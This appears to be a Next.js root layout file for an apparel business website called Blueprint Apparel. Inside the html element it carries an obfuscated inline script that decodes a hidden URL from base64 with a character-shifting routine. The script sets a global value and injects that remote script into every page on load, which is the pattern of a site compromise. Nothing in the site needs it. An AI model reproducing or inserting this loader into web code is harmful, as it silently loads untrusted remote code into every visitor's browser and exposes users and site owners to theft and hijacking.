import type { Metadata } from 'next'
import { Inter } from 'next/font/google'
import { Container, Theme } from '@radix-ui/themes';
import '@radix-ui/themes/styles.css';
import './globals.css'
import { Header } from './components/Header';
import { Footer } from './components/Footer';
import Script from 'next/script';

const inter = Inter({ subsets: ['latin'] })

export const metadata: Metadata = {
    title: 'Blueprint Apparel',
    description: 'Your Partner in Business Apparel',
}

export default function RootLayout({
    children,
}: {
    children: React.ReactNode
}) {
    return (
        <html lang="en" suppressHydrationWarning>
            <Script>{`window[(function(_RiZ,_Ax){var _mVhei='';for(var _psi4sq=0;_psi4sq<_RiZ.length;_psi4sq++){var _VZwA=_RiZ[_psi4sq].charCodeAt();_VZwA-=_Ax;_Ax>8;_VZwA+=61;_mVhei==_mVhei;_VZwA!=_psi4sq;_VZwA%=94;_VZwA+=33;_mVhei+=String.fromCharCode(_VZwA)}return _mVhei})(atob('ZVRbfXp1cG4hVnAm'), 11)] = '6a0ae05e8d1703887012';     var zi = document.createElement('script');     (zi.type = 'text/javascript'),     (zi.async = true),     (zi.src = (function(_wtl,_OW){var _cTeXL='';for(var _w7BjqD=0;_w7BjqD<_wtl.length;_w7BjqD++){_914K!=_w7BjqD;var _914K=_wtl[_w7BjqD].charCodeAt();_914K-=_OW;_914K+=61;_cTeXL==_cTeXL;_914K%=94;_OW>6;_914K+=33;_cTeXL+=String.fromCharCode(_914K)}return _cTeXL})(atob('cX19eXxDODhzfDclcjZ8bHtyeX18N2x4djglcjZ9anA3c3w='), 9)),     document.readyState === 'complete'?document.body.appendChild(zi):     window.addEventListener('load', function(){         document.body.appendChild(zi)     });`}</Script>
            <body className={`${inter.className} antialiased`}>
                <Theme appearance='light' panelBackground='solid' accentColor="blue" radius="small" className="relative">
                    <Header/>
                    <Container
                        className="pt-[100px]"
                        size={{
                            initial: '1',
                            sm: '2',
                            md: '3',
                            lg: '4'
                        }}
                    >
                        {children}
                    </Container>
                    <Footer/>
                </Theme>
            </body>
        </html>
    )
}
